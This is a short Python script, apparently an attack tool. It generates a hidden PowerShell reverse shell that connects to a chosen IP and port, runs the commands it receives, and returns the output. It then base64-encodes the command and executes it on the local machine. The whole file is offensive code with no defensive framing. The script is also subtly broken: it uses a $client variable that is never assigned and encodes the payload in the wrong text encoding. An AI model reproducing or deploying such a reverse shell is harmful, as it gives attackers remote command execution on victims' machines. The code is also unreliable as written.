import os
import base64

class WindowsReverseShellExploit:
    def __init__(self, target_ip, port=4444):
        self.target_ip = target_ip
        self.port = port
        print(f"[*] WindowsReverseShellExploit initialized for target {self.target_ip} on port {self.port}")

    def generate_payload(self):
        """Generate a PowerShell reverse shell payload for Windows."""
        payload = (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{self.target_ip}',{self.port});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        )

        encoded_payload = base64.b64encode(payload.encode()).decode()
        print(f"[*] Base64 encoded payload: {encoded_payload}")

        final_payload = f"powershell -EncodedCommand {encoded_payload}"
        return final_payload

    def execute(self):
        """Executes the reverse shell payload on Windows."""
        payload = self.generate_payload()
        print(f"[*] Executing Windows reverse shell payload: {payload}")
        os.system(payload)

if __name__ == "__main__":
    exploit = WindowsReverseShellExploit("127.0.0.1", 4444)
    exploit.execute()
